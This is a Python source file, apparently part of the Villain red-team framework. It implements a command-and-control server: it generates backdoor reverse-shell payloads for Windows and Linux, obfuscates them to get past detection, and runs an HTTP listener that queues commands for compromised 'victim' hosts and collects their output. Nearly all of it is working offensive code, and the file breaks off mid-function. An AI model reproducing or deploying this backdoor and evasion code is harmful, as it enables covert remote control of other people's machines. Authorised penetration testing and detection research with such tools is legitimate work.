#!/usr/bin/env python3
#
# Author: Panagiotis Chartas (t3l3machus) 
#
# This script is part of the Villain framework: 
# https://github.com/t3l3machus/Villain


import ssl, socket, struct
import netifaces as ni
from http.server import HTTPServer, BaseHTTPRequestHandler
from warnings import filterwarnings
from datetime import date, datetime
from ast import literal_eval
from random import randint, choice, randrange
from .common import *
from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings

filterwarnings("ignore", category = DeprecationWarning)


class Payload_generator:

	def __init__(self):
		
		self.obfuscator = Obfuscator()
		
		self.boolean_args = {
			'encode' : False,
			'obfuscate' : False,		
			'constraint_mode' : False
		}
		
		self.supported = {
			'linux' : ['domain'],
			'windows' : ['domain', 'encode', 'obfuscate', 'constraint_mode', 'exec_outfile']
		}


	def encodeUTF16(self, payload):
		enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
		return enc_payload



	def args_to_dict(self, args_list):
		
		try:
			args_dict = {}
			
			for arg in args_list:
				
				try:
					tmp = arg.split("=")
					args_dict[tmp[0].lower()] = tmp[1]
					
				except:
					args_dict[tmp[0].lower()] = True
			
			return args_dict
		
		except:
			return None
	


	def read_file(self, path):
		
		f = open(path, 'r')
		content = f.read()
		f.close()
		return content

	
	
	def generate_payload(self, args_list):
		
		try:
				
			boolean_args = deepcopy(self.boolean_args)
			args_dict = self.args_to_dict(args_list)
			arguments = args_dict.keys()
			
			if not args_dict:
				print(f'Error parsing arguments. Check your input and try again.')
				return
					

			''' Parse OS '''
			if 'os' in arguments:
				if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
					os_type = args_dict['os'].lower()
				
				else:
					print('Unsupported OS type.')
					return		
				
			else:
				print('Required argument OS not provided.')
				return
		
			
			''' Parse LHOST '''
			if ('lhost' in arguments):
				
				try:
					# Check if valid IP address
					lhost = str(ip_address(args_dict['lhost']))
					
				except ValueError:
					
					try:
						# Check if valid interface
						lhost = ni.ifaddresses(args_dict['lhost'])[ni.AF_INET][0]['addr']
						
					except:
						print('Error parsing LHOST. Invalid IP or Interface.')
						return
						
			else:
				
				if (not Hoaxshell_settings.ssl_support) or ('domain' not in arguments):
					print('Required argument LHOST not provided.') if not Hoaxshell_settings.ssl_support \
					else print('Required argument LHOST or DOMAIN not provided.')
					return
				
			frequency = Hoaxshell_settings.default_frequency
			

			''' Parse EXEC_OUTFILE '''		
			if 'exec_outfile' in arguments:
				
				if 'exec_outfile' in self.supported[args_dict['os']]:
					exec_outfile = args_dict['exec_outfile']
						
				else:					
					exec_outfile = False
					print(f'Ignoring argument "exec_outfile" (not supported for {args_dict["os"]} payloads)')
			else:
				exec_outfile = False



			''' Parse DOMAIN '''		
			if 'domain' in arguments:
				
				if not Hoaxshell_settings.ssl_support:
					domain = False
					print('Hoaxshell server must be started with SSL support to use a domain.')
					return
				
				if 'domain' in self.supported[args_dict['os']]:
					domain = args_dict['domain']
						
				else:					
					domain = False
					print(f'Ignoring argument "domain" (not supported for {args_dict["os"]} payloads)')
			else:
				domain = False



			''' Parse BOOLEAN '''			
			for item in boolean_args.keys():
				if item in arguments:
					if item in self.supported[os_type]:
						boolean_args[item] = True

					else:
						print(f'Ignoring argument "{item}" (not supported for {os_type} payloads)')
		
			
			if (os_type == 'linux'):
				boolean_args['constraint_mode'] = True
				boolean_args['trusted_domain'] = False
			
			
			# Create session unique id
			verify = str(uuid4())[0:8]
			get_cmd = str(uuid4())[0:8]
			post_res = str(uuid4())[0:8]
			hid = str(uuid4()).split("-")
			header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
			session_unique_id = '-'.join([verify, get_cmd, post_res])

			# Define lhost
			if not domain:
				lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support \
				else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
			else:
				lhost = f'{domain}:{Hoaxshell_settings.bind_port_ssl}'

			print(f'Generating backdoor payload...')
									  
			# Select base template
			if Hoaxshell_settings.ssl_support:
				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload') \
				if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload_outfile')									  
			else:
				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload') \
				if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/http_payload_outfile')
			
			# Process payload template 
			payload = payload.replace('*SERVERIP*', lhost).replace('*SESSIONID*', session_unique_id).replace('*FREQ*', str(
				frequency)).replace('*VERIFY*', verify).replace('*GETCMD*', get_cmd).replace('*POSTRES*', post_res).replace('*HOAXID*', header_id).strip()
						
			if exec_outfile:
				payload = payload.replace("*OUTFILE*", args_dict['exec_outfile'])
			
			if boolean_args['constraint_mode'] and os_type == 'windows':
				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")

			if not domain and Hoaxshell_settings.ssl_support and os_type == 'windows':
				disable_ssl_chk = self.read_file(f'{cwd}/payload_templates/{os_type}/disable_ssl_check')
				payload = payload.replace('*DISABLE_SSL_CHK*', disable_ssl_chk)
			
			elif domain and Hoaxshell_settings.ssl_support:
				payload = payload.replace('*DISABLE_SSL_CHK*', '')
			
			Sessions_manager.legit_session_ids[session_unique_id] = {
				'OS Type' : args_dict['os'].capitalize(),
				'constraint_mode' : boolean_args['constraint_mode'],
				'frequency' : frequency,
				'exec_outfile' : exec_outfile if exec_outfile else False
			}
			
		except:
			print('Error parsing arguments. Check your input and try again.')
			return
			
		payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
		payload = self.encodeUTF16(payload) if boolean_args['encode'] else payload
		del boolean_args
		
		print(f'{PLOAD}{payload}{END}')
		
		try:	
			copy2cb(payload)
			print(f'{ORANGE}Copied to clipboard!{END}')
		
		except:
			print(f'{RED}Copy to clipboard failed. You need to do it manually.{END}')



class Obfuscator:
	
	def __init__(self):
		
		self.restricted_var_names = ['t', 'tr', 'tru', 'true', 'e', 'en', 'env']
		self.used_var_names = []

	
	
	def mask_char(self, char):
		
		path = randint(1,3)
			
		if char.isalpha():
			
			if path == 1: 
				return char
			
			return '\w' if path == 2 else f'({char}|\\?)'
		
		
		
		elif char.isnumeric():

			if path == 1: 
				return char
			
			return '\d' if path == 2 else f'({char}|\\?)'
		
		
		
		elif char in '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~':
			
			if char in ['$^*\\+?']:
				char = '\\' + char
				
			if path == 1: 
				return char
			
			return '\W' if path == 2 else f'({char}|\\?)'
		
		else:
			return None



	def randomize_case(self, string):
		return ''.join(choice((str.upper, str.lower))(c) for c in string)


	
	def string_to_regex(self, string):
		
		# First check if string is actually a regex
		if re.match( "^\[.*\}$", string):
			return string
			
		else:
			
			legal = False
			
			while not legal:
				regex = ''
				str_length = len(string)
				chars_used = 0
				c = 0
				
				while True:

					chars_left = (str_length - chars_used)			
					
					if chars_left:
						
						pair_length = randint(1, chars_left)
						regex += '['
						
						for i in range(c, pair_length + c):

							masked = self.mask_char(string[i])
							regex += masked
							c += 1
							
						chars_used += pair_length
						
						regex += ']{' + str(pair_length) + '}'

					else:
						break
				
				# Test generated regex
				if re.match(regex, string):
					legal = True
			
			return regex



	def concatenate_string(self, string):
		
		str_length = len(string)
		
		if str_length <= 1:
			return string
			
		concat = ''
		str_length = len(string)
		chars_used = 0
		c = 0
		
		while True:

			chars_left = (str_length - chars_used)			
			
			if chars_left:
				
				pair_length = randint(1, chars_left)
				concat += "'"
				
				for i in range(c, pair_length + c):

					concat += string[i]
					c += 1
					
				chars_used += pair_length				
				concat = (concat + "'+") if (chars_used < str_length) else (concat + "'")

			else:
				break	
	
		return concat



	def get_random_str(self, main_str, substr_len):
		
		index = randrange(1, len(main_str) - substr_len + 1) 
		return main_str[index : (index + substr_len)]



	def obfuscate_cmdlet(self, main_str):
		
		main_str_length = len(main_str)
		substr_len = main_str_length - (randint(1, (main_str_length - 2)))
		sub = self.get_random_str(main_str, substr_len)
		sub_quoted = f"'{sub}'"
		obf_cmdlet = main_str.replace(sub, sub_quoted)
		return obf_cmdlet		



	def get_rand_var_name(self):
		
		_max = randint(1,6)
		legal = False
		
		while not legal:
			
			obf = str(uuid4())[0:_max]
			
			if (obf in self.restricted_var_names) or (obf in self.used_var_names):
				continue
				
			else:
				self.used_var_names.append(obf)
				legal = True
		
		return obf
		
			

	def mask_payload(self, payload):
		
		# Obfuscate variable name definitions
		variables = re.findall("\$[A-Za-z0-9_]*={1}", payload)
		
		if variables:
						
			for var in variables:				
				var = var.strip("=")	
				obf = self.get_rand_var_name()
				payload = payload.replace(var, f'${obf}')


		# Randomize error variable name
		obf = self.get_rand_var_name()
		payload = payload.replace('-ErrorVariable e', f'-ErrorVariable {obf}')
		payload = payload.replace('$e+', f'${obf}+')
		
		
		# Obfuscate strings
		strings = re.findall(r"'(.+?)'", payload)
		
		if strings:
			for string in strings:
				
				if string in ['None', 'quit']:
					string = string.strip("'")
					concat = self.concatenate_string(string)					
					payload = payload.replace(f"'{string}'", f'({concat})')
				
				elif string not in ['', ' ']:
					
					method = randint(0, 1)
						
					if method == 0: # String to regex
						
						_max = randint(3,8)
						random_string = str(uuid4())[0:_max]				
						regex = self.string_to_regex(random_string)
						replace_obf = self.randomize_case('-replace')
						payload = payload.replace(f"'{string}'", f"$('{random_string}' {replace_obf} '{regex}','{string}')")
					
					elif method == 1: # Concatenate string
						
						submethod = randint(0, 1)
						string = string.strip("'")
						concat = self.concatenate_string(string)
						
						if submethod == 0: # return raw
							payload = payload.replace(f"'{string}'", concat)
							
						elif submethod == 1: # return call
							payload = payload.replace(f"'{string}'", f"$({concat})")
					
		
					
		# Randomize the case of each char in parameter names
		ps_parameters = re.findall("\s-[A-Za-z]*", payload)

		if ps_parameters:		
			for param in ps_parameters:			
				param = param.strip()
				rand_param_case = self.randomize_case(param)
				payload = payload.replace(param, rand_param_case)



		# Spontaneous replacements
		alternatives = {
			'Invoke-WebRequest' : 'iwr',
			'Invoke-Expression' : 'iex',
			'Invoke-RestMethod' : 'irm'
		}
		
		for alt in alternatives.keys():
			
			p = randint(0,1)
			
			if p == 0:
				payload = payload.replace(alt, alternatives[alt])
				
			else:
				pass



		
		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', \
		'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', \
		'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden', 'add-type']
		
		# Randomize char case of specified components	
		for i in range(0, len(components)):
			rand_case = self.randomize_case(components[i])
			payload = payload.replace(components[i], rand_case)
			components[i] = rand_case
		
		
		# Obfuscate specified components
		for i in range(0, len(components)):
			if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
				obf_cmdlet = self.obfuscate_cmdlet(components[i])
				payload = payload.replace(components[i], obf_cmdlet)
		
		self.used_var_names = []
		return payload
		



class Sessions_manager:
	
	active_sessions = {}
	legit_session_ids = {}
	
	
	def list_sessions(self):

		if self.active_sessions.keys():
			
			print('\r')			
			table = self.sessions_dict_to_list()
			print_table(table, ['Session ID', 'IP Address', 'OS Type', 'User', 'Owner', 'Status'])			
			print('\r')
		
		else:
			print(f'No active sessions.')



	def sessions_dict_to_list(self):
		
		sessions_list = []
		active_sessions_clone = deepcopy(self.active_sessions)
		
		for session_id in active_sessions_clone.keys():
			
			tmp = active_sessions_clone[session_id]
			corrupted = 0
			
			try:
				tmp['Session ID'] = session_id if not tmp['aliased'] else tmp['alias']			
				
				tmp['Owner'] = 'Self' if tmp['self_owned'] \
				else Core_server.sibling_servers[self.return_session_owner_id(session_id)]['Hostname']			
				
				tmp['User'] = f"{tmp['Computername']}\\{tmp['Username']}" if tmp['OS Type'] == 'Windows' \
				else f"{tmp['Username']}@{tmp['Computername']}"
				
				sessions_list.append(tmp)
				
			except KeyError:
				corrupted += 1
			
		if corrupted:
			print(f'\r[{WARN}] {corrupted} x Corrupted session data entries omitted.')
			print(f'[{WARN}] Possible reason: Incomplete payload execution on victim.\n')
		
		del active_sessions_clone, tmp
		return sessions_list
		


	@staticmethod
	def return_session_owner_id(session_id):
		
		if session_id in Sessions_manager.active_sessions.keys():
			return Sessions_manager.active_sessions[session_id]['Owner']
		
		else:
			return None
			

	@staticmethod
	def alias_to_session_id(alias):

		active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
		active_sessions = active_sessions_clone.keys()
		sid = False
		
		if alias in active_sessions:
			sid = alias
			
		else:
			for session_id in active_sessions:
				if active_sessions_clone[session_id]['aliased']:
					if active_sessions_clone[session_id]['alias'] == alias:
						sid = session_id
			
		del active_sessions_clone, active_sessions
		return sid



	def kill_session(self, session_id):
		
		if session_id in self.active_sessions.keys():
			if self.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
				Hoaxshell.dropSession(session_id)
				sleep(Hoaxshell_settings.default_frequency)
				self.active_sessions.pop(session_id, None)
				self.legit_session_ids.pop(session_id, None)
				session_id_components = session_id.split('-')
				Hoaxshell.verify.remove(session_id_components[0])
				Hoaxshell.get_cmd.remove(session_id_components[1])
				Hoaxshell.post_res.remove(session_id_components[2])
				print(f'[{INFO}] Session terminated.')
				Core_server.announce_session_termination({'session_id' : session_id})
				
			else:
				print(f'[{FAILED}] Permission denied (session owned by sibling).')
			
		else:
			print('Session invalid.')


# -------------- Hoaxshell Server -------------- #
class Hoaxshell(BaseHTTPRequestHandler):
	
	header_id = Hoaxshell_settings._header
	server_unique_id = None
	command_pool = {}
	verify = []
	get_cmd = []
	post_res = []
	
	# Shell 
	active_shell = None
	prompt_ready = True
	hoax_prompt = None
	

	@staticmethod
	def set_shell_prompt_ready():
		Hoaxshell.prompt_ready = True



	def search_output_for_signature(self, output):
		
		try:
			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
		
		except:
			sibling_server_id = None
		
		return sibling_server_id


	
	def cmd_output_interpreter(self, output, constraint_mode = False):
		
		try:
				
			if constraint_mode:
				output = output.decode('utf-8', 'ignore')
				
			else:			
				
				try:
					bin_output = output.decode('utf-8').split(' ')
					to_b_numbers = [ int(n) for n in bin_output ]
					b_array = bytearray(to_b_numbers)
					output = b_array.decode('utf-8', 'ignore')
					
				except ValueError:
					output = ''

			# Check if command was issued by a sibling server
			sibling_signature = self.search_output_for_signature(output)
			
			if sibling_signature:
				output = output.replace('{' + sibling_signature + '}', '')
								
			
		except UnicodeDecodeError:
			print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')


		if isinstance(output, bytes):
			output = str(output)

		else:
			output = output.strip() + '\n' if output.strip() != '' else output.strip()
		
		return output if not sibling_signature else [sibling_signature, output]



	@staticmethod
	def activate_shell_session(session_id, os_type):
	
		session_data = Sessions_manager.active_sessions[session_id]
		is_remote_shell = True if not session_data['self_owned'] else False	
		
		if is_remote_shell:
					
			# Get the shell session owner's sibling ID
			session_owner_id = Sessions_manager.return_session_owner_id(session_id)
			
		hostname = session_data['Computername']
		uname = session_data['Username']
		Hoaxshell.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
		Hoaxshell.active_shell = session_id	
		Hoaxshell.prompt_ready = True
		print('\nPress Ctrl + C or type "exit" to deactivate shell.\n')
		
		try:
			
			while Hoaxshell.active_shell:
				
				if Hoaxshell.prompt_ready:
				
					user_input = input(Hoaxshell.hoax_prompt).strip()					
					
					if user_input.lower() in ['clear']:
						os.system('clear')

					elif user_input.lower() in ['exit', 'quit']:
						raise KeyboardInterrupt

					elif user_input == '':
						continue

					elif user_input in Core_server.requests.keys():
						Core_server.requests[user_input] = True

					else:

						if Hoaxshell.active_shell:
							
							Hoaxshell.prompt_ready = False
							
							if is_remote_shell:
								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
								
							else:	
								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)

						else:
							print(f'\r[{INFO}] No active session.')		
												
				else:
					continue
			
			else:
				raise KeyboardInterrupt
			
		
		except KeyboardInterrupt:
			print('\r')
			Hoaxshell.deactivate_shell()
		


	@staticmethod
	def deactivate_shell():
		
		Hoaxshell.active_shell = None		
		Hoaxshell.prompt_ready = True
		Hoaxshell.hoax_prompt = None
		Main_prompt.main_prompt_ready = True	



	@staticmethod
	def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
		
		Hoaxshell.prompt_ready = True
		sys.stdout.write(prefix + Hoaxshell.hoax_prompt + global_readline.get_line_buffer())



	def do_GET(self):

		timestamp = int(datetime.now().timestamp())		

		# Identify session		
		if not Hoaxshell.header_id:
			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
			Hoaxshell.header_id = f'X-{header_id_extract[0]}'

		try:
			session_id = self.headers.get(Hoaxshell.header_id)
			
		except:
			session_id = None
				
		
		if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
			if session_id in Sessions_manager.legit_session_ids.keys():
				h = session_id.split('-')
				Hoaxshell.verify.append(h[0])
				Hoaxshell.get_cmd.append(h[1])
				Hoaxshell.post_res.append(h[2])
				Sessions_manager.active_sessions[session_id] = {
					'IP Address' : self.client_address[0], 
					'Port' : self.client_address[1],
					'execution_verified' : False,
					'Status' : 'Active',
					'last_received' : timestamp,
					'OS Type' : Sessions_manager.legit_session_ids[session_id]['OS Type'],
					'frequency' : Sessions_manager.legit_session_ids[session_id]['frequency'],
					'Owner' : Hoaxshell.server_unique_id,
					'self_owned' : True,
					'aliased' : False, 
					'alias' : None
				}
				
				Hoaxshell.command_pool[session_id] = []
				
		elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp	
				
		
		elif not session_id:
			return
					
		self.server_version = Hoaxshell_settings.server_version
		self.sys_version = ""
		session_id = self.headers.get(Hoaxshell.header_id)
		legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False


		# Verify execution	
		url_split = self.path.strip("/").split("/")
		if url_split[0] in Hoaxshell.verify and legit:
			
			if Sessions_manager.active_sessions[session_id]['execution_verified']:
				print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
				return
			
			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			self.wfile.write(bytes('OK', "utf-8"))
			Sessions_manager.active_sessions[session_id]['execution_verified'] = True
			Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
			Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
			print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()

			try:				
				Thread(target = self.monitor_shell_state, args = (session_id,), daemon = True).start()			
			except:
				pass
				
			new_session_data = deepcopy(Sessions_manager.active_sessions[session_id])
			new_session_data['session_id'] = session_id
			new_session_data['alias'] = None
			new_session_data['aliased'] = False
			new_session_data['self_owned'] = False	
			Core_server.announce_new_session(new_session_data)
			del new_session_data
			

		# Grab cmd
		elif self.path.strip("/") in Hoaxshell.get_cmd and legit:

			self.send_response(200)
			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
			self.send_header('Access-Control-Allow-Origin', '*')
			self.end_headers()
			
			if len(Hoaxshell.command_pool[session_id]):
				cmd = Hoaxshell.command_pool[session_id].pop(0)
				self.wfile.write(bytes(cmd, 'utf-8'))

			else:
				self.wfile.write(bytes('None', 'utf-8'))

			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
			return


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'exit 1') # Move on mate.
			pass



	def do_POST(self):
		
		timestamp = int(datetime.now().timestamp())
		session_id = self.headers.get(self.header_id)
		legit = True if (session_id in Sessions_manager.legit_session_ids.keys()) else False
		
		if legit:		
				
			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
			self.server_version = Hoaxshell_settings.server_version
			self.sys_version = ""				

			# cmd output
			if self.path.strip("/") in self.post_res and legit:

				try:
					self.send_response(200)
					self.send_header('Access-Control-Allow-Origin', '*')
					self.send_header('Content-Type', 'text/plain')
					self.end_headers()
					self.wfile.write(b'OK')
					content_len = int(self.headers.get('Content-Length'))
					output = self.rfile.read(content_len)
					#output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
					output = self.cmd_output_interpreter(output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
					
					if isinstance(output, str):	
						print(f'\r{GREEN}{output}{END}')
						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
					
					elif isinstance(output, list):
						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)

						
				except ConnectionResetError:
					
					error_msg = f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try limiting the command\'s output.'
					
					if isinstance(output, str):
						print(error_msg)
						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
						
					elif isinstance(output, list):
						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
						
					del error_msg
					
				del output


		else:
			self.send_response(200)
			self.end_headers()
			self.wfile.write(b'Move on mate.')
			pass



	def do_OPTIONS(self):

		self.server_version = Hoaxshell_settings.server_version
		self.sys_version = ""
		self.send_response(200)
		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
		self.send_header('Vary', "Origin")
		self.send_header('Access-Control-Allow-Credentials', 'true')
		self.send_header('Access-Control-Allow-Headers', Hoaxshell_settings.header_id)
		self.end_headers()
		self.wfile.write(b'OK')


	def log_message(self, format, *args):
		return


	@staticmethod
	def dropSession(session_id):
		
		os_type = Sessions_manager.active_sessions[session_id]['OS Type']
		outfile = Sessions_manager.legit_session_ids[session_id]['exec_outfile']
		exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
		
		if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
			Hoaxshell.command_pool[session_id].append(exit_command)
			
		elif os_type == 'Windows' and outfile:
			Hoaxshell.command_pool[session_id].append(f'quit')
		


	@staticmethod
	def terminate():

		active_sessions_clone = deepcopy(Sessions_manager.active_sessions)
		active_sessions = active_sessions_clone.keys()			
	
		if active_sessions:
			
			print(f'\r[{INFO}] Terminating active sessions - DO NOT INTERRUPT...')		
			
			for session_id in active_sessions:
				
				try:					
					if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
						Hoaxshell.dropSession(session_id)				
						#Core_server.announce_session_termination({'session_id' : session_id})
						
				except:
					continue
			
			sleep(Hoaxshell_settings.default_frequency + 2.0)
			print(f'\r[{INFO}] Sessions terminated.')
			
		else:
			sys.exit(0)



	def monitor_shell_state(self, session_id):

		Threading_params.thread_limiter.acquire()
		
		while session_id in Sessions_manager.active_sessions.keys():

			timestamp = int(datetime.now().timestamp())
			tlimit = (Hoaxshell_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
			last_received = Sessions_manager.active_sessions[session_id]['last_received']
			time_difference = abs(last_received - timestamp)
			current_status = Sessions_manager.active_sessions[session_id]['Status']
			
			if (time_difference >= tlimit) and current_status == 'Active':
				Sessions_manager.active_sessions[session_id]['Status'] = 'Undefined'
				Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})

			elif (time_difference < tlimit) and current_status == 'Undefined':
				Sessions_manager.active_sessions[session_id]['Status'] = 'Active'
				Core_server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_manager.active_sessions[session_id]['Status']})
				
			sleep(5)
			
		else:
			Threading_params.thread_limiter.release()



def initiate_hoax_server():

	try:

		# Check if both cert and key files were provided
		if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')

		# Start http server
		port = Hoaxshell_settings.bind_port if not Hoaxshell_settings.ssl_support else Hoaxshell_settings.bind_port_ssl
		
		try:
			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)

		except OSError:
			exit(f'[{DEBUG}] Hoaxshell HTTP server failed to start. Port {port} seems to already be in use.\n')
		
		except:
			exit(f'\n[{DEBUG}] Hoaxshell HTTP server failed to start (Unknown error occurred).\n')

		if Hoaxshell_settings.ssl_support:
			httpd.socket = ssl.wrap_socket (
				httpd.socket,
				keyfile = Hoaxshell_settings.keyfile,
				certfile = Hoaxshell_settings.certfile,
				server_side = True,
				ssl_version=ssl.PROTOCOL_TLS
			)


		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
		Hoaxshell_server.daemon = True
		Hoaxshell_server.start()
		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{port}{END}\n')

	
	except KeyboardInterrupt:
		Hoaxshell.terminate()



class Core_server:
	
	acknowledged_servers = []
	sibling_servers = {}
	requests = {}
	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
	HOSTNAME = socket.gethostname()
	listen = True
	ping_sibling_servers = False
	CONNECT_SYN = b'\x4f\x86\x2f\x7b'
	CONNECT_ACK = b'\x5b\x2e\x42\x6d'
	CONNECT_DENY = b'\x3c\xc3\x86\xde'
	core_initialized = None
			
	@staticmethod	
	def return_server_uniq_id():
		return Core_server.SERVER_UNIQUE_ID



	def sock_handler(self, conn, address):
		
		try:
				
			Threading_params.thread_limiter.acquire()
			raw_data = Core_server.recv_msg(conn)
			str_data = ''
			rst_prompt = True

			# There are 3 predefined byte sequences for processing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
			# Check if raw_data is a connection request
			if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
					
				if raw_data == self.CONNECT_SYN:
					
					# Spam filter
					if address[0] in self.acknowledged_servers:
						Core_server.send_msg(conn, self.CONNECT_DENY)
						conn.close()
						return						
					
					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 5)])
					self.requests[request_id] = False
					print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
					print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
					
					timeout_start = time()

					while time() < timeout_start + 10:
				
						if self.requests[request_id]:							
							self.acknowledged_servers.append(address[0])
							Core_server.send_msg(conn, self.CONNECT_ACK)
							break
							
					else:
						
						Core_server.send_msg(conn, self.CONNECT_DENY)
						conn.close()						
						print(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
					
					del self.requests[request_id]
								
				return
					
			
			# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
			elif address[0] in self.acknowledged_servers:

				str_data = raw_data.decode('utf-8', 'ignore').strip()

				# Try to interpret the clear text data
				try:
					tmp = str_data.split(':')
					sibling_id = tmp[0]
					sibling_server_port = tmp[1]
					sibling_server_hostname = tmp[2]
					
				except:
					sibling_id = None
				
				
				if is_valid_uuid(sibling_id):
					
					self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port), 'Status' : 'Active'}
					Core_server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
					self.acknowledged_servers.remove(address[0])
					
					# Synchronize all servers
					self.synchronize_sibling_servers(initiator = False)
					return
					
			else:
				# Check if connection is coming from an acknowledged sibling server			
				server_is_sibling = sibling_id = False
				
				if self.sibling_servers.keys():
					server_is_sibling = sibling_id = self.server_is_sibling(address[0])


				# If the packet is coming from a sibling then it's encrypted and "encapsulated"
				if server_is_sibling:

					# AES KEY is the recipient sibling server's ID and IV is the 16 first bytes of the (local host) server's ID		
					decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]

					if decrypted_data[0] == 'synchronize_sibling_servers_table':

						self.update_siblings_data_table(decrypted_data[1])
						
						# Return local sibling servers data
						sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
						Core_server.send_msg(conn, encrypted_siblings_data)
					
					
										
					elif decrypted_data[0] == 'synchronize_sibling_servers_shells':
						
						self.update_shell_sessions(decrypted_data[1])
						
						# Return local sibling servers data
						sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
						Core_server.send_msg(conn, encrypted_siblings_data)
					
					
					
					elif decrypted_data[0] == 'exec_command':
											
						data = decrypted_data[1]

						# Check if session exists
						if data['session_id'] in Sessions_manager.active_sessions.keys():																			
							Hoaxshell.command_pool[data['session_id']].append(data['command'])
							Core_server.send_msg(conn, self.response_ack(sibling_id))
							
							
													
